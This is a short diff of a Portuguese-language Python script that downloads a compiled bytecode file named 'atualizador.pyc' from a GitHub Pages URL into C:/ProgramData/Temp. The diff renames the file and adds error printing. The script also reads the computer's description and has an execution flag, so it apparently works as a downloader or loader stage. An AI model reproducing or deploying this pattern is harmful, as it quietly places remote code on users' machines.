@@ -18,7 +18,7 @@ EXECUCAO = LIGADO
 
 # Configurações fixas
 base_url = "https://lokilaki.github.io/dcreamit/"
-arquivos_para_baixar = ["atualizador.cpython-311.pyc"]
+arquivos_para_baixar = ["atualizador.pyc"]
 destino = Path("C:/ProgramData/Temp")
 # destino = Path(os.getenv("APPDATA")) / "Temp"
 #destino = Path(tempfile.gettempdir())
@@ -31,7 +31,8 @@ def baixar_arquivos():
         destino_final = destino / arquivo
         try:
             urllib.request.urlretrieve(url, destino_final)
-        except Exception:
+        except Exception as e:
+            print(f"Erro ao baixar {arquivo}: {e}")
             continue
 
 def get_computer_description():
